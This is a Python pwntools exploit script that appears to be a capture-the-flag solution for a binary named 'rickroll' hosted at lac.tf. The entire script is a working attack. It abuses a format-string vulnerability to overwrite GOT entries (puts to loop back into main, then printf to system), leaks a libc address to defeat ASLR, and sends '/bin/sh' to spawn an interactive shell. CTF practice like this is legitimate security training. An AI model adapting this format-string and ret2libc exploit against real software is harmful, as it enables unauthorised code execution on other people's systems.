from pwn import *

import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--remote', action='store_true')
    args = parser.parse_args()

    context.terminal = ['tmux', 'splitw', '-h']
    elf = context.binary = ELF('./rickroll')

    leaker = b'%39$018p'

    def exec_fmt(payload):
        p = process()
        p.sendline(leaker + payload)
        return p.recvall()
    fmt_str = FmtStr(exec_fmt)

    if args.remote:
        io = remote('lac.tf', 31135)
    elif args.debug:
        io = gdb.debug(context.binary.path, '''
        set follow-fork-mode child
        break main
        continue
        ''')
    else:
        io = process()

    io.recvuntil(b'Lyrics: ')

    writes = {
        # Crashes with anything other than a single-byte write
        elf.symbols['main_called']: p8(0),
        elf.got['puts']: elf.symbols['main'],
    }
    payload = leaker + fmtstr_payload(fmt_str.offset, writes, numbwritten=18)
    print(writes, payload, len(payload))
    io.sendline(payload)

    print(hexdump(io.recvuntil(b'gonna run around and ')))
    libc_start_leak = int(io.recvn(18), 16) - 234
    lib_base_addr = libc_start_leak - elf.libc.sym['__libc_start_main']
    print('__libc_start_main leak', hex(libc_start_leak))
    print('libc base', hex(lib_base_addr))
    print('system adress', hex(lib_base_addr + elf.libc.sym['system']))

    # Phase 2

    def exec_fmt(payload):
        p = process()
        p.sendline(payload)
        return p.recvall()
    fmt_str = FmtStr(exec_fmt)

    io.recvuntil(b'Lyrics: ')
    writes = {
        elf.got['puts']: 0x004011ac,
        elf.got['printf']: lib_base_addr + elf.libc.sym['system'],
    }
    payload = fmtstr_payload(fmt_str.offset, writes, numbwritten=0)
    print(writes, payload, len(payload))
    io.sendline(payload)

    io.sendline(b'/bin/sh\x00')

    io.interactive()
